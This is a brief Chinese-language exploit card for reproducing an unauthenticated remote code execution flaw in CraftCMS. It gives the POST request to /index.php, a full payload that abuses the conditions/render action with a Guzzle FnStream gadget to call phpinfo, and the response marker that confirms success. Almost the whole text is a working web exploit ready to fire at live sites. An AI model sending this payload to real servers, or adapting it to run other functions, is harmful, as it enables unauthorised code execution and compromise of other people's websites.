# CraftCMS未授权RCE漏洞复现

CraftCMS ｜ 命令执行 ｜ —
- **请求**：`POST /index.php HTTP/1.1`

**Payload**
```
action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
```
- **响应特征**：200 PHP Version